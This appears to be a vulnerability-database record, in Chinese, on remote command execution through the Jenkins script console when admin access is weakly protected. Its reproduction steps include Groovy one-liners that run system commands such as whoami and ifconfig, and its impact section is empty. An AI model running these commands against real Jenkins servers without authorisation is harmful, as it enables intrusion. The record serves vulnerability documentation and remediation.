---
source: "hatch 补库批 20260928"
product: "Jenkins/脚本控制台弱口令或错误授权"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Jenkins 功能未授权访问导致的远程命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：非特定版本漏洞；需要管理权限或错误配置允许访问"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-cc03d5dabed44e60e9acee95"
entity_id: "ve-cc03d5dabed44e60e9acee95"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：非特定版本漏洞；需要管理权限或错误配置允许访问

代码与实验材料：界面入口与Groovy例子，明确正常管理功能；后果为Jenkins进程权限

来源证据范围：补库归档未给原作者或官方权限文档

- **操作与副作用边界（1）**：缺风险配置及资源说明；依据：影响节空白，末尾image占位；没区分弱口令与匿名管理权限的检测/整改。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Jenkins功能未授权访问导致的远程命令执行漏洞

一、漏洞简介
------------

Jenkins管理登陆之后，后台"系统管理"功能，有个"脚本命令行的"功能，它的作用是执行用于管理或故障探测或诊断的任意脚本命令，利用该功能，可以执行系统命令，该功能实际上Jenkins正常的功能，由于很多管理账号使用了弱口令，或者管理后台存在未授权访问，导致该功能会对Jenkins系统服务器产生比较严重的影响和危害。

二、漏洞影响
------------

三、复现过程
------------

找到"系统管理"------"脚本命令行"。

![](./.resource/Jenkins功能未授权访问导致的远程命令执行漏洞/media/rId24.png)

![](./.resource/Jenkins功能未授权访问导致的远程命令执行漏洞/media/rId25.png)

输入任意的Groovy脚本并在服务器上执行它。对于故障排除和诊断很有用。使用'println'命令查看输出（如果使用System.out，它将输出到服务器的标准输出，很难看到。）示例：

    println(Jenkins.instance.pluginManager.plugins)

在脚本命令行中输入下面的语句，即可执行相应的命令：

    println "whoami".execute().text

![](./.resource/Jenkins功能未授权访问导致的远程命令执行漏洞/media/rId26.png)

    println "ifconfig".execute().text

image
